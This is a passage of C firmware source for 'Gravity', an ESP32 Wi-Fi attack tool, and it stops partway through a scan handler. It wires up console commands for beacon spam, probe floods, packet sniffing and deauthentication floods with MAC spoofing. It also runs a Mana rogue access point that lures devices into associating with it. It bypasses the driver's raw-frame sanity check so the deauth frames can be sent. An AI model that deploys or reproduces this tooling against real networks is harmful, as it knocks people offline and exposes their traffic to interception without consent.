/* Basic console example (esp_console_repl API)

   This example code is in the Public Domain (or CC0 licensed, at your option.)

   Unless required by applicable law or agreed to in writing, this
   software is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
   CONDITIONS OF ANY KIND, either express or implied.
*/

#include "gravity.h"
#include "esp_err.h"
#include "esp_log.h"
#include "beacon.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "freertos/portmacro.h"
//#include "common.h"
#include "probe.h"
#include "scan.h"
#include "deauth.h"

#define MAX_CHANNEL 9

char **user_ssids = NULL;
int user_ssid_count = 0;
static long hop_millis = 0;
static enum HopStatus hopStatus = HOP_STATUS_OFF;
static TaskHandle_t channelHopTask = NULL;

uint8_t probe_response_raw[] = {
0x50, 0x00, 0x3c, 0x00, 
0x08, 0x5a, 0x11, 0xf9, 0x23, 0x3d, // destination address
0x20, 0xe8, 0x82, 0xee, 0xd7, 0xd5, // source address
0x20, 0xe8, 0x82, 0xee, 0xd7, 0xd5, // BSSID
0xc0, 0x72,                         // Fragment number 0 seq number 1836
0xa3, 0x52, 0x5b, 0x8d, 0xd2, 0x00, 0x00, 0x00, 0x64, 0x00,
0x11, 0x11, // 802.11 Privacy Capability, 0x1101 == no. 0x11 0x11 == yes
            /* Otherwise AND existing bytes with 0b11101111 */
0x00, 0x08, // Parameter Set (0), SSID Length (8)
            // To fill: SSID
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c, 0x20, 0x01, 0x00, 0x23, 0x02, 0x14,
0x00, 0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac,       /* Group cipher suite OUI */
0x04,                   /* Group cipher suite type: AES */
0x01, 0x00,             /* Pairwise cipher suite count */
0x00, 0x0f, 0xac,       /* Pairwise cipher suite OUI */
0x04,                   /* Pairwise cipher suite type: AES */
0x01, 0x00,             /* Auth key management suite count */
0x00, 0x0f, 0xac,       /* Auth key management OUI */
0x02,                   /* Auth key management type: PSK */
0x0c, 0x00, 0x46, 0x05, 0x32, 0x08, 0x01, 0x00, 0x00, 0x2d, 0x1a, 0xef, 0x08, 0x17, 0xff, 0xff,
0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x3d, 0x16, 0x95, 0x0d, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0x08, 0x04,
0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x40, 0xbf, 0x0c, 0xb2, 0x58, 0x82, 0x0f, 0xea, 0xff, 0x00,
0x00, 0xea, 0xff, 0x00, 0x00, 0xc0, 0x05, 0x01, 0x9b, 0x00, 0x00, 0x00, 0xc3, 0x04, 0x02, 0x02,
0x02, 0x02,
/* 0x71, 0xb5, 0x92, 0x42 // Frame check sequence */
};

int PROBE_RESPONSE_DEST_ADDR_OFFSET = 4;
int PROBE_RESPONSE_SRC_ADDR_OFFSET = 10;
int PROBE_RESPONSE_BSSID_OFFSET = 16;
int PROBE_RESPONSE_PRIVACY_OFFSET = 34;
int PROBE_RESPONSE_SSID_OFFSET = 38;
int PROBE_RESPONSE_GROUP_CIPHER_OFFSET = 62; /* + ssid_len */
int PROBE_RESPONSE_PAIRWISE_CIPHER_OFFSET = 68; /* + ssid_len */
int PROBE_RESPONSE_AUTH_TYPE_OFFSET = 74; /* + ssid_len */

#define PROMPT_STR CONFIG_IDF_TARGET

/* Console command history can be stored to and loaded from a file.
 * The easiest way to do this is to use FATFS filesystem on top of
 * wear_levelling library.
 */
#if CONFIG_CONSOLE_STORE_HISTORY

#define MOUNT_PATH "/data"
#define HISTORY_PATH MOUNT_PATH "/history.txt"

/* Over-ride the default implementation so we can send deauth frames */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

/* Evaluate whether channel hopping should be enabled based on currently-active
   features and their defaults
*/
bool isHopEnabledByDefault() {
    int i = 0;
    /* Loop exits either at the end of the array or when an active task
       with hopping enabled is found
    */
    for (; i < ATTACKS_COUNT && (!attack_status[i] || !hop_defaults[i]); ++i) { }
    return (i < ATTACKS_COUNT);
}

/* Evaluate whether channel hopping is enabled, using the combination of
   hopStatus and isHopEnabledByDefault()
*/
bool isHopEnabled() {
    return (hopStatus == HOP_STATUS_ON || (hopStatus == HOP_STATUS_DEFAULT && isHopEnabledByDefault()));
}

/* Calculate the default dwell time (hop_millis) based on the features that are currently active */
/* Where multiple features are active the greatest dwell time will be returned */
int dwellForCurrentFeatures() {
    int retVal = 0;
    for (int i = 0; i < ATTACKS_COUNT; ++i) {
        if (attack_status[i] && hop_defaults[i] && hop_millis_defaults[i] > retVal) {
            retVal = hop_millis_defaults[i];
        }
    }
    /* If no features are active use the global default */
    if (retVal == 0) {
        retVal = DEFAULT_HOP_MILLIS;
    }
    return retVal;
}

int dwellTime() {
    switch (hopStatus) {
    case HOP_STATUS_ON:
        return hop_millis;
        break;
    case HOP_STATUS_DEFAULT:
    case HOP_STATUS_OFF:        /* Don't really care what we do here */
        return dwellForCurrentFeatures();
        break;
    }
    return -1;                  /* Error condition */
}

bool arrayContainsString(char **arr, int arrCnt, char *str) {
    int i;
    for (i=0; i < arrCnt && strcmp(arr[i], str); ++i) { }
    return (i != arrCnt);
}

/* Channel hopping task  */
void channelHopCallback(void *pvParameter) {
    uint8_t ch;
    wifi_second_chan_t sec;
    if (hop_millis == 0) {
        hop_millis = DEFAULT_HOP_MILLIS;
    }

    while (true) {
        // Delay hop_millis ms
        vTaskDelay(hop_millis / portTICK_PERIOD_MS);

        /* Check whether we should be hopping or not */
        if (isHopEnabled()) {
            ESP_ERROR_CHECK(esp_wifi_get_channel(&ch, &sec));
            ch++;
            if (ch >= MAX_CHANNEL) {
                ch -= (MAX_CHANNEL - 1);
            }
            if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_ABOVE) != ESP_OK) {
                ESP_LOGW(TAG, "Failed to change to channel %d", ch);
            }
        }
    }
}

/* Functions to manage target-ssids */
int countSsid() {
	return user_ssid_count;
}

char **lsSsid() {
	return user_ssids;
}

int addSsid(char *ssid) {
	#ifdef DEBUG_VERBOSE
		printf("Commencing addSsid(\"%s\"). target-ssids contains %d values:\n", ssid, user_ssid_count);
		for (int i=0; i < user_ssid_count; ++i) {
			printf("    %d: \"%s\"\n", i, user_ssids[i]);
		}
	#endif
	char **newSsids = malloc(sizeof(char*) * (user_ssid_count + 1));
	if (newSsids == NULL) {
		ESP_LOGE(BEACON_TAG, "Insufficient memory to add new SSID");
		return ESP_ERR_NO_MEM;
	}
	for (int i=0; i < user_ssid_count; ++i) {
		newSsids[i] = user_ssids[i];
	}

	#ifdef DEBUG_VERBOSE
		printf("After creating a larger array and copying across previous values the new array was allocated %d elements. Existing values are:\n", (user_ssid_count + 1));
		for (int i=0; i < user_ssid_count; ++i) {
			printf("    %d: \"%s\"\n", i, newSsids[i]);
		}
	#endif

	newSsids[user_ssid_count] = malloc(sizeof(char) * (strlen(ssid) + 1));
	if (newSsids[user_ssid_count] == NULL) {
		ESP_LOGE(BEACON_TAG, "Insufficient memory to add SSID \"%s\"", ssid);
		return ESP_ERR_NO_MEM;
	}
	strcpy(newSsids[user_ssid_count], ssid);
	++user_ssid_count;

	#ifdef DEBUG_VERBOSE
		printf("After adding the final item and incrementing length counter newSsids has %d elements. The final item is \"%s\"\n", user_ssid_count, newSsids[user_ssid_count - 1]);
		printf("Pointers are:\tuser_ssids: %p\tnewSsids: %p\n", user_ssids, newSsids);
	#endif
	free(user_ssids);
	user_ssids = newSsids;
	#ifdef DEBUG_VERBOSE
		printf("After freeing user_ssids and setting newSsids pointers are:\tuser_ssids: %p\tnewSsids: %p\n", user_ssids, newSsids);
	#endif

	return ESP_OK;
}

int rmSsid(char *ssid) {
	int idx;

	// Get index of ssid if it exists
	for (idx = 0; (idx < user_ssid_count && strcasecmp(ssid, user_ssids[idx])); ++idx) {}
	if (idx == user_ssid_count) {
		ESP_LOGW(BEACON_TAG, "Asked to remove SSID \'%s\', but could not find it in user_ssids", ssid);
		return ESP_ERR_INVALID_ARG;
	}

	char **newSsids = malloc(sizeof(char*) * (user_ssid_count - 1));
	if (newSsids == NULL) {
		ESP_LOGE(BEACON_TAG, "Unable to allocate memory to remove SSID \'%s\'", ssid);
		return ESP_ERR_NO_MEM;
	}

	// Copy shrunk array to newSsids
	for (int i = 0; i < user_ssid_count; ++i) {
		if (i < idx) {
			newSsids[i] = user_ssids[i];
		} else if (i > idx) {
			newSsids[i-1] = user_ssids[i];
		}
	}
	free(user_ssids[idx]);
	free(user_ssids);
	user_ssids = newSsids;
	--user_ssid_count;
	return ESP_OK;
}

/* Control channel hopping
   Usage: hop [ MILLIS ] [ ON | OFF | DEFAULT | KILL ]
   Not specifying a parameter will report the status. KILL terminates the event loop.
*/
int cmd_hop(int argc, char **argv) {
    if (argc > 3) {
        ESP_LOGE(HOP_TAG, "%s", USAGE_HOP);
        return ESP_ERR_INVALID_ARG;
    }

    if (argc == 1) {
        char hopMsg[39] = "\0";
        switch (hopStatus) {
        case HOP_STATUS_OFF:
            strcpy(hopMsg, "is disabled");
            break;
        case HOP_STATUS_ON:
            strcpy(hopMsg, "is enabled");
            break;
        case HOP_STATUS_DEFAULT:
            sprintf(hopMsg, "will use defaults; currently %s.", (isHopEnabled())?"enabled":"disabled");
            break;
        }
        ESP_LOGI(HOP_TAG, "Channel hopping %s; Gravity will dwell on each channel for approximately %ldms", hopMsg, hop_millis);
    } else {
        /* argv[1] could be a duration, "on" or "off" */
        /* To avoid starting hopping before updating hop_millis we need to check for duration first */
        long duration = atol(argv[1]);
        if (duration > 0) {
            hop_millis = duration;
            ESP_LOGI(HOP_TAG, "Gravity will dwell on each channel for %ldms.", duration);
        } else if (!strcasecmp(argv[1], "ON") || (argc == 3 && !strcasecmp(argv[2], "ON"))) {
            hopStatus = HOP_STATUS_ON;
            char strOutput[220] = "Channel hopping enabled. ";
            char working[128];
            if (hop_millis == 0) {
                hop_millis = dwellForCurrentFeatures();
                sprintf(working, "HOP_MILLIS is unconfigured. Using default value of ");
            } else {
                sprintf(working, "HOP_MILLIS set to ");
            }
            strcat(strOutput, working);
            sprintf(working, "%ld milliseconds.", hop_millis);
            strcat(strOutput, working);
            ESP_LOGI(HOP_TAG, "%s", strOutput);
            if (channelHopTask == NULL) {
                ESP_LOGI(HOP_TAG, "Gravity's channel hopping event task is not running, starting it now.");
                xTaskCreate(&channelHopCallback, "channelHopCallback", 2048, NULL, 5, &channelHopTask);
            }
        } else if (!strcasecmp(argv[1], "OFF") || (argc == 3 && !strcasecmp(argv[2], "OFF"))) {
            hopStatus = HOP_STATUS_OFF;
            ESP_LOGI(HOP_TAG, "Channel hopping disabled.");
        } else if (!strcasecmp(argv[1], "KILL") || (argc == 3 && !strcasecmp(argv[2], "KILL"))) {
            hopStatus = HOP_STATUS_OFF;
            if (channelHopTask == NULL) {
                ESP_LOGE(HOP_TAG, "Unable to locate the channel hop task. Is it running?");
                return ESP_ERR_INVALID_ARG;
            } else {
                ESP_LOGI(HOP_TAG, "Killing WiFi channel hopping event task %p...", &channelHopTask);
                vTaskDelete(channelHopTask);
                channelHopTask = NULL;
            }
        } else if (!strcasecmp(argv[1], "DEFAULT") || (argc == 3 && !strcasecmp(argv[2], "DEFAULT"))) {
            hopStatus = HOP_STATUS_DEFAULT;
            hop_millis = dwellForCurrentFeatures();
            ESP_LOGI(HOP_TAG, "Channel hopping will use feature defaults.");
        } else {
            /* Invalid argument */
            ESP_LOGE(HOP_TAG, "Invalid arguments provided: %s", USAGE_HOP);
            return ESP_ERR_INVALID_ARG;
        }
    }
    /* Recalculate hop_millis */
    hop_millis = dwellTime();       /* Cover your bases */
    return ESP_OK;
}

int cmd_commands(int argc, char **argv) {
    ESP_LOGI(TAG, "Generating command summary...");
    for (int i=0; i < CMD_COUNT - 1; ++i) { /* -1 because they already know about this command */
        printf("%-13s: %s\n", commands[i].command, commands[i].hint);
    }
    return ESP_OK;
}

int cmd_beacon(int argc, char **argv) {
    /* rickroll | random | user | off | status */
    /* Initially the 'TARGET MAC' argument is unsupported, the attack only supports broadcast beacon frames */
    /* argc must be 1 or 2 - no arguments, or rickroll/random/user/infinite/off */
    if (argc < 1 || argc > 3) {
        ESP_LOGE(TAG, "Invalid arguments specified. Expected 0 or 1, received %d.", argc - 1);
        return ESP_ERR_INVALID_ARG;
    }
    if (argc == 1) {
        ESP_LOGI(TAG, "Beacon Status: %s", attack_status[ATTACK_BEACON]?"Running":"Not Running");
        return ESP_OK;
    }

    int ret = ESP_OK;
    // Update attack_status[ATTACK_BEACON] appropriately
    if (!strcasecmp(argv[1], "off")) {
        attack_status[ATTACK_BEACON] = false;
    } else {
        attack_status[ATTACK_BEACON] = true;
    }

    /* Start/stop hopping task loop as needed */
    hop_millis = dwellTime();
    char *args[] = {"hop","on"};
    if (isHopEnabled()) {
        ESP_ERROR_CHECK(cmd_hop(2, args));
    } else {
        args[1] = "off";
        ESP_ERROR_CHECK(cmd_hop(2, args));
    }

    /* Handle arguments to beacon */
    int ssidCount = DEFAULT_SSID_COUNT;
    if (!strcasecmp(argv[1], "rickroll")) {
        ret = beacon_start(ATTACK_BEACON_RICKROLL, 0);
    } else if (!strcasecmp(argv[1], "random")) {
        if (SSID_LEN_MIN == 0) {
            SSID_LEN_MIN = 8;
        }
        if (SSID_LEN_MAX == 0) {
            SSID_LEN_MAX = 32;
        }
        if (argc == 3) {
            ssidCount = atoi(argv[2]);
            if (ssidCount == 0) {
                ssidCount = DEFAULT_SSID_COUNT;
            }
        }
        ret = beacon_start(ATTACK_BEACON_RANDOM, ssidCount);
    } else if (!strcasecmp(argv[1], "user")) {
        ret = beacon_start(ATTACK_BEACON_USER, 0);
    } else if (!strcasecmp(argv[1], "infinite")) {
        ret = beacon_start(ATTACK_BEACON_INFINITE, 0);
    } else if (!strcasecmp(argv[1], "off")) {
        ret = beacon_stop();
    } else {
        ESP_LOGE(TAG, "Invalid argument provided to BEACON: \"%s\"", argv[1]);
        return ESP_ERR_INVALID_ARG;
    }
    return ret;
}

/* This feature does not modify channel hopping settings */
int cmd_target_ssids(int argc, char **argv) {
    int ssidCount = countSsid();
    // Must have no args (return current value) or two (add/remove SSID)
    if ((argc != 1 && argc != 3) || (argc == 1 && ssidCount == 0)) {
        if (ssidCount == 0) {
            ESP_LOGI(TAG, "targt-ssids has no elements.");
        } else {
            ESP_LOGE(TAG, "target-ssids must have either no arguments, to return its current value, or two arguments: ADD/REMOVE <ssid>");
            return ESP_ERR_INVALID_ARG;
        }
        return ESP_OK;
    }
    char temp[40];
    if (argc == 1) {
        char *strSsids = malloc(sizeof(char) * ssidCount * 32);
        if (strSsids == NULL) {
            ESP_LOGE(TAG, "Unable to allocate memory to display user SSIDs");
            return ESP_ERR_NO_MEM;
        }
        #ifdef DEBUG_VERBOSE
            printf("Serialising target SSIDs");
        #endif
        strcpy(strSsids, (lsSsid())[0]);
        #ifdef DEBUG_VERBOSE
            printf("Before serialisation loop returned value is \"%s\"\n", strSsids);
        #endif
        for (int i = 1; i < ssidCount; ++i) {
            sprintf(temp, " , %s", (lsSsid())[i]);
            strcat(strSsids, temp);
            #ifdef DEBUG_VERBOSE
                printf("At the end of iteration %d retVal is \"%s\"\n",i, strSsids);
            #endif
        }
        printf("Selected SSIDs: %s\n", strSsids);
    } else if (!strcasecmp(argv[1], "add")) {
        return addSsid(argv[2]);
    } else if (!strcasecmp(argv[1], "remove")) {
        return rmSsid(argv[2]);
    }

    return ESP_OK;
}

int cmd_probe(int argc, char **argv) {
    // Syntax: PROBE [ ANY | SSIDS | OFF ]
    if ((argc > 3) || (argc > 1 && strcasecmp(argv[1], "ANY") && strcasecmp(argv[1], "SSIDS") && strcasecmp(argv[1], "OFF")) || (argc == 3 && !strcasecmp(argv[1], "OFF"))) {
        ESP_LOGW(PROBE_TAG, "%s", USAGE_PROBE);
        return ESP_ERR_INVALID_ARG;
    }

    if (argc == 1) {
        ESP_LOGI(PROBE_TAG, "Probe Status: %s", (attack_status[ATTACK_PROBE])?"Running":"Not Running");
        return ESP_OK;
    }

    /* Set attack_status[ATTACK_PROBE] before checking channel hopping or starting/stopping */
    attack_status[ATTACK_PROBE] = !strcasecmp(argv[1], "OFF");

    /* Start hopping task loop if hopping is on by default */
    hop_millis = dwellTime();
    char *args[] = {"hop","on"};
    if (isHopEnabled()) {
        ESP_ERROR_CHECK(cmd_hop(2, args));
    } else {
        args[1] = "off";
        ESP_ERROR_CHECK(cmd_hop(2, args));
    }

    probe_attack_t probeType = ATTACK_PROBE_UNDIRECTED; // Default

    if (!strcasecmp(argv[1], "OFF")) {
        ESP_LOGI(PROBE_TAG, "Stopping Probe Flood ...");
        probe_stop();
    } else {
        // Gather parameters for probe_start()
        if (!strcasecmp(argv[1], "SSIDS")) {
            probeType = ATTACK_PROBE_DIRECTED;
        }

        char probeNote[100];
        sprintf(probeNote, "Starting a probe flood of %spackets%s", (probeType == ATTACK_PROBE_UNDIRECTED)?"broadcast ":"", (probeType == ATTACK_PROBE_DIRECTED)?" directed to ":"");
        if (probeType == ATTACK_PROBE_DIRECTED) {
            char suffix[16];
            sprintf(suffix, "%d SSIDs", countSsid());
            strcat(probeNote, suffix);
        }

        ESP_LOGI(PROBE_TAG, "%s", probeNote);
        probe_start(probeType);
    }
    return ESP_OK;
}

int cmd_sniff(int argc, char **argv) {
    // Usage: sniff [ ON | OFF ]
    if (argc > 2) {
        ESP_LOGE(TAG, "%s", USAGE_SNIFF);
        return ESP_ERR_INVALID_ARG;
    }

    if (argc == 1) {
        ESP_LOGI(TAG, "Sniffing is %s", (attack_status[ATTACK_SNIFF])?"enabled":"disabled");
        return ESP_OK;
    }

    if (!strcasecmp(argv[1], "on")) {
        attack_status[ATTACK_SNIFF] = true;
    } else if (!strcasecmp(argv[1], "off")) {
        attack_status[ATTACK_SNIFF] = false;
    } else {
        ESP_LOGE(TAG, "%s", USAGE_SNIFF);
        return ESP_ERR_INVALID_ARG;
    }

    /* Start hopping task loop if hopping is on by default */
    hop_millis = dwellTime();
    char *args[] = {"hop","on"};
    if (isHopEnabled()) {
        ESP_ERROR_CHECK(cmd_hop(2, args));
    } else {
        args[1] = "off";
        ESP_ERROR_CHECK(cmd_hop(2, args));
    }
    return ESP_OK;
}

int cmd_deauth(int argc, char **argv) {
    /* Usage: deauth [ <millis> ] [ FRAME | DEVICE | SPOOF ] [ STA | BROADCAST | OFF ] */
    if (argc > 4 || (argc == 4 && strcasecmp(argv[3], "STA") && strcasecmp(argv[3], "BROADCAST") &&
            strcasecmp(argv[3], "OFF")) || (argc == 4 && atol(argv[1]) == 0 && atol(argv[2]) == 0) ||
            (argc == 4 && strcasecmp(argv[1], "FRAME") && strcasecmp(argv[2], "FRAME") &&
            strcasecmp(argv[1], "DEVICE") && strcasecmp(argv[2], "DEVICE") &&
            strcasecmp(argv[1], "SPOOF") && strcasecmp(argv[2], "SPOOF")) ||
            (argc == 3 && strcasecmp(argv[2], "STA") && strcasecmp(argv[2], "BROADCAST") &&
            strcasecmp(argv[2], "OFF")) || (argc == 3 && atol(argv[1]) == 0 &&
            strcasecmp(argv[1], "FRAME") && strcasecmp(argv[1], "DEVICE") && strcasecmp(argv[1], "SPOOF")) ||
            (argc == 2 && strcasecmp(argv[1], "STA") &&
            strcasecmp(argv[1], "BROADCAST") && strcasecmp(argv[1], "OFF"))) {
        ESP_LOGE(TAG, "%s", USAGE_DEAUTH);
        return ESP_ERR_INVALID_ARG;
    }
    if (argc == 1) {
        ESP_LOGI(DEAUTH_TAG, "Deauth is %srunning.", (attack_status[ATTACK_DEAUTH])?"":"not ");
        return ESP_OK;
    }

    /* Extract parameters */
    long delay = DEAUTH_MILLIS_DEFAULT;
    DeauthMAC setMAC = DEAUTH_MAC_FRAME;
    DeauthMode dMode = DEAUTH_MODE_OFF;
    switch (argc) {
    case 4:
        /* command must be in [3]*/
        if (!strcasecmp(argv[3], "STA")) {
            dMode = DEAUTH_MODE_STA;
        } else if (!strcasecmp(argv[3], "BROADCAST")) {
            dMode = DEAUTH_MODE_BROADCAST;
        } else if (!strcasecmp(argv[3], "OFF")) {
            dMode = DEAUTH_MODE_OFF;
        }
        delay = atol(argv[1]);
        if (delay == 0) {
            delay = atol(argv[2]);
        }
        /* Retrieve MAC mode */
        if (!strcasecmp(argv[1], "FRAME") || !strcasecmp(argv[2], "FRAME")) {
            setMAC = DEAUTH_MAC_FRAME;
        } else if (!strcasecmp(argv[1], "DEVICE") || !strcasecmp(argv[2], "DEVICE")) {
            setMAC = DEAUTH_MAC_DEVICE;
        } else if (!strcasecmp(argv[1], "SPOOF") || !strcasecmp(argv[2], "SPOOF")) {
            setMAC = DEAUTH_MAC_SPOOF;
        }
        break;
    case 3:
        if (!strcasecmp(argv[2], "STA")) {
            dMode = DEAUTH_MODE_STA;
        } else if (!strcasecmp(argv[2], "BROADCAST")) {
            dMode = DEAUTH_MODE_BROADCAST;
        } else if (!strcasecmp(argv[2], "OFF")) {
            dMode = DEAUTH_MODE_OFF;
        }
        delay = atol(argv[1]); /* If argv[1] contains setMAC then delay will be set to 0 - perfect! */
        if (!strcasecmp(argv[1], "FRAME")) {
            setMAC = DEAUTH_MAC_FRAME;
        } else if (!strcasecmp(argv[1], "DEVICE")) {
            setMAC = DEAUTH_MAC_DEVICE;
        } else if (!strcasecmp(argv[1], "SPOOF")) {
            setMAC = DEAUTH_MAC_SPOOF;
        }
        break;
    case 2:
        if (!strcasecmp(argv[1], "STA")) {
            dMode = DEAUTH_MODE_STA;
        } else if (!strcasecmp(argv[1], "BROADCAST")) {
            dMode = DEAUTH_MODE_BROADCAST;
        } else if (!strcasecmp(argv[1], "OFF")) {
            dMode = DEAUTH_MODE_OFF;
        }
        break;
    default:
        /* Unreachable */
    }
    attack_status[ATTACK_DEAUTH] = (dMode != DEAUTH_MODE_OFF);

    /* Start/Stop channel hopping as required */
    hop_millis = dwellTime();
    char *args[] = {"hop","on"};
    if (isHopEnabled()) {
        ESP_ERROR_CHECK(cmd_hop(2, args));
    } else {
        args[1] = "off";
        ESP_ERROR_CHECK(cmd_hop(2, args));
    }
    return deauth_start(dMode, setMAC, delay);
}

/* Control the Mana attack
   The Mana attack is intended to 'trick' wireless devices into
   connecting to an AP that you control by impersonating a known
   trusted AP.
   Mana listens for directed probe requests (those that specify
   an SSID) and responds with the corresponding probe response,
   claiming to have the SSID requested.
   As long as the device's MAC does not change during the attack
   (so don't run an attack with MAC hopping simultaneously), the
   target station may then begin association with Gravity.
   This attack is typically successful only for SSID's that use
   open authentication (i.e. no password); if a STA is expecting
   an SSID it trusts to offer the open authentication it expects,
   the device will proceed to associate and allow Gravity to
   control its network connectivity.
   Usage: mana ( ( [ VERBOSE ] [ ON | OFF ] ) | AUTH [ NONE | WEP | WPA ] )
   VERBOSE :  Display messages as packets are sent and received,
              providing attack status
   ON | OFF:  Start or stop either the Mana attack or verbose logging
   AUTH    :  Set or display auth method

   TODO :  Display status of attack - Number of responses sent,
           number of association attempts, number of successful
           associations.

 */
int cmd_mana(int argc, char **argv) {
    if (argc > 3) {
        ESP_LOGE(TAG, "%s", USAGE_MANA);
        return ESP_ERR_INVALID_ARG;
    }

    bool launchMana = false; /* Not a very elegant way to restructure channel hopping... */

    if (argc == 1) {
        ESP_LOGI(MANA_TAG, "Mana is %s", (attack_status[ATTACK_MANA])?"Enabled":"Disabled");
    } else if (!strcasecmp(argv[1], "VERBOSE")) {
        if (argc == 2) {
            ESP_LOGI(MANA_TAG, "Mana Verbose Logging is %s", (attack_status[ATTACK_MANA_VERBOSE])?"Enabled":"Disabled");
        } else if (argc == 3 && (!strcasecmp(argv[2], "ON") || !strcasecmp(argv[2], "OFF"))) {
            attack_status[ATTACK_MANA_VERBOSE] = strcasecmp(argv[2], "OFF");
        } else {
            ESP_LOGE(MANA_TAG, "%s", USAGE_MANA);
            return ESP_ERR_INVALID_ARG;
        }
    } else if (!strcasecmp(argv[1], "OFF") || !strcasecmp(argv[1], "ON")) {
        attack_status[ATTACK_MANA] = strcasecmp(argv[1], "OFF");
    } else if (!strcasecmp(argv[1], "AUTH")) {
        if (argc == 2) {
            // return mana_auth
            ESP_LOGI(MANA_TAG, "Mana authentication method: %s", (mana_auth==AUTH_TYPE_NONE)?"Open Authentication":(mana_auth==AUTH_TYPE_WEP)?"Wireless Equivalent Privacy":"Wi-Fi Protected Access");
            return ESP_OK;
        } else if (argc == 3 && !(strcasecmp(argv[2], "NONE") && strcasecmp(argv[2], "WEP") && strcasecmp(argv[2], "WPA"))) {
            // set mana_auth
            if (!strcasecmp(argv[2], "NONE")) {
                mana_auth = AUTH_TYPE_NONE;
            } else if (!strcasecmp(argv[2], "WEP")) {
                mana_auth = AUTH_TYPE_WEP;
            } else if (!strcasecmp(argv[2], "WPA")) {
                mana_auth = AUTH_TYPE_WPA;
            }
        } else {
            ESP_LOGE(MANA_TAG, "%s", USAGE_MANA);
            return ESP_ERR_INVALID_ARG;
        }
    } else if (!strcasecmp(argv[1], "LOUD")) {
        if (argc == 2) {
            ESP_LOGI(MANA_TAG, "Mana is %srunning : LOUD-Mana is %s", (attack_status[ATTACK_MANA])?"":"not ", (attack_status[ATTACK_MANA_LOUD])?"Enabled":"Disabled");
            return ESP_OK;
        }
        if (!(strcasecmp(argv[2], "ON") && strcasecmp(argv[2], "OFF"))) {
            attack_status[ATTACK_MANA_LOUD] = strcasecmp(argv[2], "OFF");

            if (!attack_status[ATTACK_MANA]) {
                /* Mana isn't running - Start it */
                launchMana = true;
            }
        } else {
            ESP_LOGE(MANA_TAG, "%s", USAGE_MANA);
            return ESP_ERR_INVALID_ARG;
        }
    } else if (!strcasecmp(argv[1], "clear")) {
        /* Clean up networkList */
        for (int i = 0; i < networkCount; ++i) {
            if (networkList[i].ssidCount > 0) {
                free(networkList[i].ssids);
            }
        }
        free(networkList);
    } else {
        ESP_LOGE(MANA_TAG, "%s", USAGE_MANA);
        return ESP_ERR_INVALID_ARG;
    }

    /* Now that attack_status has been set correctly,
       start or stop channel hopping as needed
    */
    hop_millis = dwellTime();
    char *args[] = {"hop","on"};
    if (isHopEnabled()) {
        ESP_ERROR_CHECK(cmd_hop(2, args));
    } else {
        args[1] = "off";
        ESP_ERROR_CHECK(cmd_hop(2, args));
    }

    /* Now that channel hopping has been set appropriately,
       launch Mana if needed
    */
    if (launchMana) {
        ESP_LOGI(MANA_TAG, "Mana is not running. Starting ...");
        char *manaArgs[2] = { "mana", "ON" };
        attack_status[ATTACK_MANA] = true;
        cmd_mana(2, manaArgs);
    }

    return ESP_OK;
}

int cmd_stalk(int argc, char **argv) {

    return ESP_OK;
}

int cmd_ap_dos(int argc, char **argv) {
    /* TODO: Update attack_status[] */

    /* Start hopping task loop if hopping is on by default */
    hop_millis = dwellTime();
    char *args[] = {"hop","on"};
    if (isHopEnabled()) {
        ESP_ERROR_CHECK(cmd_hop(2, args));
    } else {
        args[1] = "off";
        ESP_ERROR_CHECK(cmd_hop(2, args));
    }

    return ESP_OK;
}

int cmd_ap_clone(int argc, char **argv) {
    /* TODO: Update attack_status[] */

    /* Start hopping task loop if hopping is on by default */
    hop_millis = dwellTime();
    char *args[] = {"hop","on"};
    if (isHopEnabled()) {
        ESP_ERROR_CHECK(cmd_hop(2, args));
    } else {
        args[1] = "off";
        ESP_ERROR_CHECK(cmd_hop(2, args));
    }

    return ESP_OK;
}

int cmd_scan(int argc, char **argv) {
    if (argc > 3 || (argc == 3 && strcasecmp(argv[2], "ON") && strcasecmp(argv[2], "OFF")) ||
            (argc == 2 && strcasecmp(argv[1], "ON") && strcasecmp(argv[1], "OFF")) ||
            (argc == 3 && strlen(argv[1]) > 32)) {
        ESP_LOGE(TAG, "%s", USAGE_SCAN);
        return ESP_ERR_INVALID_ARG;
    }

    if (argc == 1) {
        char strMsg[128];
        char working[64];
        sprintf(strMsg, "Scanning is %s. Network selection is configured to sniff ", (attack_status[ATTACK_SCAN])?"Active":"Inactive");
        if (strlen(scan_filter_ssid) == 0) {
            strcat(strMsg, "packets from all networks.");
        } else {
            sprintf(working, "packets from the SSID \"%s\"", scan_filter_ssid);
            strcat(strMsg, working);
        }
        ESP_LOGI(TAG, "%s", strMsg);
        return ESP_OK;
    }

    if (argc == 3) {
        /* Copying NULLs might be a *bit* excessive ... */
        memset(scan_filter_ssid, '\0', 33);
        memset(scan_filter_ssid_bssid, 0x00, 6);
        strcpy(scan_filter_ssid, argv[1]);

        /* See if we've already seen the AP */
        int i;
        for (i = 0; i < gravity_ap_count && strcmp(scan_filter_ssid,
                                (char *)gravity_aps[i].espRecord.ssid); ++i) { }
        if (i < gravity_ap_count) {
            #ifdef DEBUG
                char strMac[18] = "\0";
                ESP_ERROR_CHECK(mac_bytes_to_string(scan_filter_ssid_bssid, strMac));
                printf("Had already seen BSSID %s for AP \"%s\"\n", strMac, scan_filter_ssid);
            #endif
            memcpy(scan_filter_ssid_bssid, gravity_aps[i].espRecord.bssid, 6);
        }
    }

    if (argc == 2) {
        memset(scan_filter_ssid, '\0', 33);
        memset(scan_filter_ssid_bssid, 0x00, 6);
    }

    if ((argc == 2 && !strcasecmp(argv[1], "ON")) || (argc == 3 && !strcasecmp(argv[2], "ON"))) {
        attack_status[ATTACK_SCAN] = true;
    } else {
        attack_status[ATTACK_SCAN] = false;
    }
    ESP_LOGI(SCAN_TAG, "Scanning is %s", (attack_status[ATTACK_SCAN])?"ON":"OFF");

